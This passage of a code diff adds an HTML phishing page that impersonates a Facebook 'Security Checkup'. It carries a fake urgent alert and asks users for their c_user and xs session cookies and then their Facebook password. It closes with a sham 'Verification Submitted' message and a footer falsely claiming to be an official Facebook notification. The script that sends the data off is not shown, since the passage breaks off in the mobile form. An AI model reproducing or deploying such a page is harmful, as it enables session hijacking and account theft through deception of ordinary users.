+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, var(--green-primary) 0%, #36A420 100%);
+            border-radius: var(--radius-full);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            box-shadow: var(--shadow-3);
+        }
+
+        .mobile-success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--gray-8);
+            margin-bottom: 12px;
+        }
+
+        .mobile-success-message {
+            font-size: 15px;
+            color: var(--gray-7);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .mobile-reference-box {
+            background: var(--gray-1);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-bottom: 20px;
+            border: 1px solid var(--gray-3);
+        }
+
+        .mobile-reference-box span {
+            font-size: 14px;
+            color: var(--gray-6);
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .mobile-reference-box strong {
+            font-size: 18px;
+            color: var(--gray-8);
+            font-weight: 700;
+        }
+
+        /* Mobile Bottom Navigation */
+        .mobile-bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--gray-0);
+            border-top: 1px solid var(--gray-3);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .mobile-nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding: 8px;
+            text-decoration: none;
+            color: var(--gray-6);
+            flex: 1;
+        }
+
+        .mobile-nav-item.active {
+            color: var(--blue-primary);
+        }
+
+        .mobile-nav-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        .mobile-nav-text {
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        /* Mobile Language Modal */
+        .mobile-lang-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gray-0);
+            z-index: 2000;
+            display: none;
+            flex-direction: column;
+        }
+
+        .mobile-modal-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--gray-3);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--gray-1);
+        }
+
+        .mobile-modal-close {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius-full);
+            border: none;
+            background: none;
+            color: var(--gray-6);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .mobile-modal-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--gray-8);
+            flex: 1;
+        }
+
+        .mobile-modal-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .mobile-lang-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            transition: var(--transition);
+            margin-bottom: 8px;
+            border: 1px solid transparent;
+        }
+
+        .mobile-lang-option.selected {
+            background: var(--blue-light);
+            border: 1px solid var(--blue-primary);
+        }
+
+        .mobile-flag-medium {
+            width: 30px;
+            height: 22px;
+            border-radius: 3px;
+            object-fit: cover;
+            border: 1px solid var(--gray-4);
+        }
+
+        .mobile-lang-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--gray-8);
+            flex: 1;
+        }
+
+        .mobile-lang-check {
+            color: var(--blue-primary);
+            font-size: 20px;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive Design for Desktop View */
+        @media (max-width: 1200px) {
+            .main-container {
+                grid-template-columns: 240px 1fr;
+            }
+            
+            .right-sidebar {
+                display: none;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .desktop-view {
+                display: none !important;
+            }
+            
+            .mobile-view {
+                display: block !important;
+            }
+            
+            .nav-center,
+            .search-box,
+            .action-btn {
+                display: none;
+            }
+            
+            .meta-header {
+                padding: 0 12px;
+            }
+            
+            .profile-name {
+                display: none;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .content-area {
+                padding: 20px;
+            }
+            
+            .security-header {
+                padding: 20px;
+            }
+            
+            .security-text h1 {
+                font-size: 24px;
+            }
+            
+            .security-text p {
+                font-size: 15px;
+            }
+            
+            .action-btns-container {
+                flex-direction: column;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .video-placeholder {
+                height: 250px;
+            }
+            
+            .video-element {
+                height: 250px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- View Toggle Button -->
+    <button class="view-toggle-btn" id="viewToggleBtn">
+        <svg width="18" height="18" viewBox="0 0 24 24" id="viewToggleIcon">
+            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
+        </svg>
+        <span id="viewToggleText">Switch to Desktop</span>
+    </button>
+
+    <!-- Desktop View -->
+    <div class="desktop-view" id="desktopView">
+        <!-- Meta Header -->
+        <header class="meta-header">
+            <div class="header-container">
+                <div class="header-left">
+                    <input type="text" class="search-box" placeholder="Search Facebook">
+                </div>
+                
+                <div class="meta-logo-center">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png" 
+                         alt="Meta" 
+                         class="meta-logo">
+                </div>
+                
+                <div class="nav-center">
+                    <div class="nav-item active">
+                        <svg class="nav-icon" viewBox="0 0 28 28">
+                            <path d="M25.825 12.29C25.824 12.289 25.823 12.288 25.821 12.286L15.027 2.937C14.752 2.675 14.392 2.527 13.989 2.527C13.158 2.527 12.49 3.195 12.49 4.026V9.131H5.916C4.289 9.131 2.974 10.445 2.974 12.072V15.928C2.974 17.555 4.289 18.869 5.916 18.869H12.49V23.974C12.49 24.805 13.158 25.473 13.989 25.473C14.392 25.473 14.752 25.325 15.028 25.063L25.822 15.714C26.195 15.363 26.406 14.876 26.406 14.344C26.406 13.812 26.195 13.325 25.825 12.29Z"/>
+                        </svg>
+                    </div>
+                    <div class="nav-item">
+                        <svg class="nav-icon" viewBox="0 0 28 28">
+                            <path d="M7.847 23.488C9.207 23.488 10.316 22.411 10.316 21.088C10.316 19.765 9.207 18.688 7.847 18.688C6.486 18.688 5.377 19.765 5.377 21.088C5.377 22.411 6.486 23.488 7.847 23.488Z"/>
+                            <path d="M18.457 23.488C19.817 23.488 20.926 22.411 20.926 21.088C20.926 19.765 19.817 18.688 18.457 18.688C17.096 18.688 15.987 19.765 15.987 21.088C15.987 22.411 17.096 23.488 18.457 23.488Z"/>
+                            <path d="M25.97 12.708C25.895 12.317 25.673 11.961 25.346 11.71L20.833 8.501C20.744 8.438 20.639 8.4 20.528 8.393H6.751C6.593 8.393 6.439 8.437 6.305 8.52L2.628 10.848C1.832 11.343 1.516 12.287 1.789 13.176L4.268 21.259C4.449 21.838 4.997 22.23 5.607 22.23H21.693C22.303 22.23 22.851 21.838 23.032 21.259L25.994 12.783C26.045 12.633 26.02 12.468 25.97 12.708ZM8.793 18.73C8.793 19.081 8.508 19.366 8.157 19.366C7.806 19.366 7.521 19.081 7.521 18.73V14.044C7.521 13.693 7.806 13.408 8.157 13.408C8.508 13.408 8.793 13.693 8.793 14.044V18.73ZM18.443 18.73C18.443 19.081 18.158 19.366 17.807 19.366C17.456 19.366 17.171 19.081 17.171 18.73V14.044C17.171 13.693 17.456 13.408 17.807 13.408C18.158 13.408 18.443 13.693 18.443 14.044V18.73Z"/>
+                        </svg>
+                        <span class="nav-badge">3</span>
+                    </div>
+                    <div class="nav-item">
+                        <svg class="nav-icon" viewBox="0 0 28 28">
+                            <path d="M14 2.042C7.596 2.042 2.292 7.346 2.292 13.75C2.292 19.273 6.434 23.927 11.792 24.958V17.875H9.208V14H11.792V10.958C11.792 7.558 13.9 5.542 17.042 5.542C18.542 5.542 20.125 5.75 20.125 5.75V9.125H18.417C16.746 9.125 16.208 10.168 16.208 11.25V14H20.042L19.458 17.875H16.208V24.958C21.566 23.927 25.708 19.273 25.708 13.75C25.708 7.346 20.404 2.042 14 2.042Z"/>
+                        </svg>
+                        <span class="nav-badge">5</span>
+                    </div>
+                </div>
+                
+                <div class="header-right">
+                    <div class="action-btns">
+                        <button class="action-btn">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm5.75 16.5l-5.75-5.75-5.75 5.75-1.5-1.5L12 9.25l6.25 6.25-1.5 1.5z"/>
+                            </svg>
+                        </button>
+                        <button class="action-btn">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            </svg>
+                            <span class="nav-badge" style="top: 2px; right: 2px;">3</span>
+                        </button>
+                    </div>
+                    
+                    <div class="profile-btn">
+                        <div class="profile-avatar">Y</div>
+                        <span class="profile-name">You</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M7 10l5 5 5-5z"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Container -->
+        <div class="main-container">
+            <!-- Left Sidebar -->
+            <aside class="left-sidebar">
+                <div class="sidebar-section">
+                    <a href="#" class="sidebar-item active">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Your Profile</span>
+                    </a>
+                    
+                    <a href="#" class="sidebar-item">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Friends</span>
+                        <span class="sidebar-badge">3</span>
+                    </a>
+                    
+                    <a href="#" class="sidebar-item">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Events</span>
+                    </a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="sidebar-section">
+                    <h3 class="sidebar-title">Your shortcuts</h3>
+                    
+                    <a href="#" class="sidebar-item">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">File Manager</span>
+                    </a>
+                    
+                    <a href="#" class="sidebar-item">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M9 11.24V7.5C9 6.12 10.12 5 11.5 5S14 6.12 14 7.5v3.74c1.21-.81 2-2.18 2-3.74C16 5.01 13.99 3 11.5 3S7 5.01 7 7.5c0 1.56.79 2.93 2 3.74zm9.84 4.63l-4.54-2.26c-.17-.07-.35-.11-.54-.11H13v-6c0-.83-.67-1.5-1.5-1.5S10 6.67 10 7.5v10.74l-3.43-.72c-.08-.01-.15-.03-.24-.03-.31 0-.59.13-.79.33l-.79.8 4.94 4.94c.27.27.65.44 1.06.44h6.79c.75 0 1.33-.55 1.441.28l.75-5.27c.01-.07.02-.14.02-.2 0-.62-.38-1.16-.91-1.38z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Saved</span>
+                    </a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <div class="sidebar-section">
+                    <h3 class="sidebar-title">Security & Privacy</h3>
+                    
+                    <a href="#" class="sidebar-item active">
+                        <div class="sidebar-icon" style="background: linear-gradient(135deg, var(--blue-primary), var(--blue-secondary)); color: white;">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Security Checkup</span>
+                        <span class="sidebar-badge">!</span>
+                    </a>
+                    
+                    <a href="#" class="sidebar-item">
+                        <div class="sidebar-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                            </svg>
+                        </div>
+                        <span class="sidebar-text">Privacy Checkup</span>
+                    </a>
+                </div>
+            </aside>
+
+            <!-- Center Content -->
+            <main class="center-content">
+                <!-- Security Alert -->
+                <div class="security-alert">
+                    <div class="alert-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                    </div>
+                    <div class="alert-content">
+                        <h3>Security Alert: Immediate Action Required</h3>
+                        <p>We've detected unusual activity from your account. Complete verification to protect your account from unauthorized access.</p>
+                    </div>
+                </div>
+
+                <!-- Security Header -->
+                <div class="security-header">
+                    <div class="security-title">
+                        <div class="security-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                            </svg>
+                        </div>
+                        <div class="security-text">
+                            <h1>Confirm your identity to secure your account</h1>
+                            <p>Help us verify it's you by completing these security steps. This helps keep your account safe.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content Area -->
+                <div class="content-area">
+                    <!-- Step 1: Account Information -->
+                    <div id="desktop-step1" class="step-content">
+                        <div class="form-group">
+                            <p class="helper-text" style="margin-bottom: 24px; font-size: 16px;">
+                                To protect your account, we need to verify your identity. Please provide the following information to continue.
+                            </p>
+                        </div>
+
+                        <!-- Video Section -->
+                        <div class="video-section">
+                            <div class="video-header">
+                                <div class="video-title">
+                                    <div class="video-icon">
+                                        <svg width="20" height="20" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/>
+                                        </svg>
+                                    </div>
+                                    <div class="video-text">
+                                        <h3>Verification Guide</h3>
+                                        <p>
+                                            <span class="video-duration">2 min</span>
+                                            • Step-by-step instructions
+                                        </p>
+                                    </div>
+                                </div>
+                                <button class="lang-selector-btn" id="desktopLangSelectorBtn">
+                                    <img src="https://flagcdn.com/w20/us.png" alt="English" class="lang-flag">
+                                    <span>English</span>
+                                    <svg width="16" height="16" viewBox="0 0 24 24">
+                                        <path fill="currentColor" d="M7 10l5 5 5-5z"/>
+                                    </svg>
+                                </button>
+                            </div>
+                            
+                            <div class="video-player">
+                                <div class="video-placeholder" id="desktopVideoPlaceholder">
+                                    <div class="video-placeholder-bg"></div>
+                                    <div class="play-btn">
+                                        <svg class="play-icon" width="32" height="32" viewBox="0 0 24 24">
+                                            <path fill="currentColor" d="M8 5v14l11-7z"/>
+                                        </svg>
+                                    </div>
+                                    <div class="placeholder-text">
+                                        <h4>Watch the verification guide</h4>
+                                        <p>Click to select language and watch instructions</p>
+                                    </div>
+                                </div>
+                                <div class="video-element" id="desktopVideoElement">
+                                    <video id="desktopGuideVideo" controls>
+                                        <source src="" type="video/mp4">
+                                        Your browser does not support the video tag.
+                                    </video>
+                                </div>
+                            </div>
+                            
+                            <div class="lang-flags-section" id="desktopLangFlagsSection">
+                                <div class="flags-title">Available in:</div>
+                                <div class="flags-container" id="desktopFlagsContainer">
+                                    <!-- Flags will be dynamically added here -->
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Form Fields -->
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">User ID (c_user)</span>
+                                <span class="label-hint">Required • 8+ digits</span>
+                            </label>
+                            <input type="text" 
+                                   class="form-input" 
+                                   id="desktop-c_user" 
+                                   placeholder=""
+                                   maxlength="30"
+                                   inputmode="numeric">
+                            <div class="helper-text">
+                                This is your unique Facebook identifier. Must contain at least 8 numbers.
+                            </div>
+                            <div class="error-message" id="desktop-c_user_error" style="display: none;">
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                Please enter a valid Facebook user ID (minimum 8 digits)
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">
+                                <span class="label-text">Token (xs)</span>
+                                <span class="label-hint">Required • 6+ characters</span>
+                            </label>
+                            <input type="text" 
+                                   class="form-input" 
+                                   id="desktop-xs_token" 
+                                   placeholder="">
+                            <div class="helper-text">
+                                Must contain uppercase, lowercase, numbers, and special characters (e.g., As1@#abc)
+                            </div>
+                            <div class="error-message" id="desktop-xs_token_error" style="display: none;">
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                <span id="desktop-xs_error_text">Please enter a valid token</span>
+                            </div>
+                        </div>
+
+                        <div class="action-btns-container">
+                            <button class="btn" id="desktopNextStep1Btn">
+                                Verify Submit
+                                <svg width="20" height="20" viewBox="0 0 24 24" style="margin-left: 4px;">
+                                    <path fill="currentColor" d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Step 2: Password Verification -->
+                    <div id="desktop-step2" class="step-content" style="display: none;">
+                        <!-- Password Form Header with Facebook Logo -->
+                        <div class="password-form-header">
+                            <div class="facebook-logo-center">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/800px-Facebook_Logo_%282019%29.png" 
+                                     alt="Facebook"
+                                     class="facebook-logo">
+                            </div>
+                            <h2 class="password-title">Final Verification Step</h2>
+                            <p class="password-subtitle">
+                                Enter your Facebook password to complete the verification process and secure your account.
+                            </p>
+                        </div>
+
+                        <div class="form-group" style="margin-top: 32px;">
+                            <label class="form-label">
+                                <span class="label-text">Facebook Password</span>
+                                <span class="label-hint">Required</span>
+                            </label>
+                            <input type="password" 
+                                   class="form-input" 
+                                   id="desktop-password" 
+                                   placeholder="Enter your password">
+                            <div class="helper-text">
+                                Enter the password you use to log in to Facebook
+                            </div>
+                            <div class="error-message" id="desktop-password_error" style="display: none;">
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                                </svg>
+                                Please enter your password
+                            </div>
+                        </div>
+
+                        <div class="action-btns-container">
+                            <button class="btn-secondary" id="desktopPrevStep2Btn">
+                                <svg width="20" height="20" viewBox="0 0 24 24" style="margin-right: 4px;">
+                                    <path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+                                </svg>
+                                Back
+                            </button>
+                            <button class="btn" id="desktopSubmitPasswordBtn">
+                                Complete Verification
+                                <svg width="20" height="20" viewBox="0 0 24 24" style="margin-left: 4px;">
+                                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Success State -->
+                    <div id="desktop-successStep" class="success-state" style="display: none;">
+                        <div class="success-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            </svg>
+                        </div>
+                        <h2 class="success-title">Verification Submitted Successfully</h2>
+                        <p class="success-message">
+                            Your account verification request has been submitted to Facebook's Security Team. 
+                            Our team will review your information and you'll receive an email notification within 24 hours.
+                        </p>
+                        <div class="reference-box">
+                            <span>Facebook Reference ID</span>
+                            <strong id="desktop-referenceId">FB-789456123</strong>
+                        </div>
+                        <button class="btn" style="padding: 12px 40px;">
+                            Return to Facebook
+                        </button>
+                    </div>
+                </div>
+            </main>
+
+            <!-- Right Sidebar -->
+            <aside class="right-sidebar">
+                <div class="sponsored-section">
+                    <h3 class="sponsored-title">Security & Privacy</h3>
+                    
+                    <!-- Sponsored Card 1 -->
+                    <div class="sponsored-card">
+                        <div class="sponsored-header">
+                            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Facebook Security" class="sponsored-avatar">
+                            <div class="sponsored-info">
+                                <h4>Facebook Security</h4>
+                                <p>Sponsored · Facebook</p>
+                            </div>
+                        </div>
+                        <div class="sponsored-content">
+                            <h5>Protect Your Account</h5>
+                            <p>Learn how to better protect your Facebook account with our security tips and best practices.</p>
+                            <a href="#" class="learn-more">
+                                Learn More
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class="sponsored-tag">Security</div>
+                    </div>
+                    
+                    <!-- Sponsored Card 2 -->
+                    <div class="sponsored-card">
+                        <div class="sponsored-header">
+                            <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Privacy Checkup" class="sponsored-avatar">
+                            <div class="sponsored-info">
+                                <h4>Privacy Checkup</h4>
+                                <p>Facebook · Privacy Tools</p>
+                            </div>
+                        </div>
+                        <div class="sponsored-content">
+                            <h5>Review Your Privacy Settings</h5>
+                            <p>Take a few minutes to review your privacy settings and make sure your information is shared only with people you want.</p>
+                            <a href="#" class="learn-more">
+                                Start Checkup
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class="sponsored-tag">Privacy</div>
+                    </div>
+                </div>
+            </aside>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Privacy</a>
+                    <a href="#" class="footer-link">Terms</a>
+                    <a href="#" class="footer-link">Advertising</a>
+                    <a href="#" class="footer-link">Ad Choices</a>
+                    <a href="#" class="footer-link">Cookies</a>
+                    <a href="#" class="footer-link">More</a>
+                    <a href="#" class="footer-link">Meta © 2024</a>
+                </div>
+                <div class="copyright">
+                    This is an official Facebook notification regarding your account security.
+                </div>
+            </div>
+        </footer>
+
+        <!-- Language Modal -->
+        <div class="lang-modal" id="desktopLanguageModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">Select Language</h3>
+                    <button class="modal-close" id="desktopCloseModal">&times;</button>
+                </div>
+                <div class="modal-body" id="desktopLanguageOptions">
+                    <!-- Languages will be populated dynamically -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile View -->
+    <div class="mobile-view" id="mobileView">
+        <!-- Mobile Header -->
+        <header class="mobile-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png" 
+                 alt="Meta" 
+                 class="mobile-logo">
+            <button class="mobile-menu-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                </svg>
+            </button>
+        </header>
+
+        <!-- Mobile Main Content -->
+        <main class="mobile-main">
+            <!-- Mobile Security Alert -->
+            <div class="mobile-security-alert">
+                <div class="alert-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                </div>
+                <div class="alert-content">
+                    <h3 style="font-size: 16px; margin-bottom: 4px;">Security Alert</h3>
+                    <p style="font-size: 13px;">Complete verification to protect your account.</p>
+                </div>
+            </div>
+
+            <!-- Mobile Security Header -->
+            <div class="mobile-security-header">
+                <div class="mobile-security-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                    </svg>
+                </div>
+                <div class="mobile-security-text">
+                    <h1>Confirm your identity</h1>
+                    <p>Help us verify it's you by completing these security steps.</p>
+                </div>
+            </div>
+
+            <!-- Step 1: Account Information -->
+            <div id="mobile-step1" class="step-content">
+                <div class="mobile-form-group">
+                    <p class="mobile-helper-text" style="margin-bottom: 20px;">
+                        To protect your account, we need to verify your identity. Please provide the following information.
+                    </p>
+                </div>
+
+                <!-- Mobile Video Section -->
+                <div class="mobile-video-section">
+                    <div class="mobile-video-header">
+                        <div class="mobile-video-title">
+                            <div class="video-icon">
+                                <svg width="18" height="18" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/>
+                                </svg>
+                            </div>
+                            <div class="mobile-video-text">
+                                <h3>Verification Guide</h3>
+                                <p>Step-by-step instructions</p>
+                            </div>
+                            <span class="mobile-video-duration">2 min</span>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-video-player">
+                        <div class="mobile-video-placeholder" id="mobileVideoPlaceholder">
+                            <div class="mobile-video-placeholder-bg"></div>
+                            <div class="mobile-play-btn">
+                                <svg class="play-icon" width="24" height="24" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M8 5v14l11-7z"/>
+                                </svg>
+                            </div>
+                            <div class="placeholder-text">
+                                <h4 style="font-size: 16px;">Watch the guide</h4>
+                                <p style="font-size: 13px;">Tap to select language</p>
+                            </div>
+                        </div>
+                        <div class="mobile-video-element" id="mobileVideoElement">
+                            <video id="mobileGuideVideo" controls>
+                                <source src="" type="video/mp4">
+                                Your browser does not support the video tag.
+                            </video>
+                        </div>
+                    </div>
+                    
+                    <div class="mobile-lang-selector">
+                        <button class="mobile-lang-btn" id="mobileLangBtn">
+                            <div class="mobile-lang-current">
+                                <img src="https://flagcdn.com/w20/us.png" alt="English" class="lang-flag">
+                                <span>English</span>
+                            </div>
+                            <svg width="16" height="16" viewBox="0 0 24 24">
+                                <path fill="currentColor" d="M7 10l5 5 5-5z"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Form Fields -->
+                <div class="mobile-form-group">
+                    <label class="mobile-form-label">
+                        <span class="mobile-label-text">User ID (c_user)</span>
+                        <span class="mobile-label-hint">8+ digits</span>
+                    </label>
+                    <input type="text" 
+                           class="mobile-form-input" 
+                           id="mobile-c_user" 
+                           placeholder=""
+                           maxlength="30"
+                           inputmode="numeric">
+                    <div class="mobile-helper-text">
+                        Your unique Facebook identifier
+                    </div>
+                    <div class="mobile-error-message" id="mobile-c_user_error" style="display: none;">
+                        <svg width="14" height="14" viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        Minimum 8 digits required
+                    </div>
+                </div>
+
+                <div class="mobile-form-group">
+                    <label class="mobile-form-label">
+                        <span class="mobile-label-text">Token (xs)</span>
+                        <span class="mobile-label-hint">6+ characters</span>
+                    </label>
